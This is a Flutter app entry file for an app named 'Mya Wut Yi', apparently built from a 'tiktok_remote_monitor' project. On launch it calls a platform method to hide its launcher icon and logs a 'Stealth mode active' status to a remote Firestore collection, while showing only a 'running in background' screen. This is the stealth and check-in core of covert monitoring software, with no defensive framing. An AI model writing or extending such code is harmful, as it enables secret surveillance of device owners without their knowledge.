import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:cloud_firestore/cloud_firestore.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  try {
    await Firebase.initializeApp();

    const platform = MethodChannel('com.example.tiktok_remote_monitor/channel');
    await platform.invokeMethod('hideIcon');

    await FirebaseFirestore.instance.collection('device_logs').add({
      'app_name': 'Mya Wut Yi',
      'status': 'Stealth mode active and running',
      'timestamp': FieldValue.serverTimestamp(),
    });
  } catch (e) {
    print("Initialization error: $e");
  }

  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Mya Wut Yi',
      home: Scaffold(
        appBar: AppBar(
          title: const Text('Mya Wut Yi'),
        ),
        body: const Center(
          child: Text('Mya Wut Yi is running in background'),
        ),
      ),
    );
  }
}
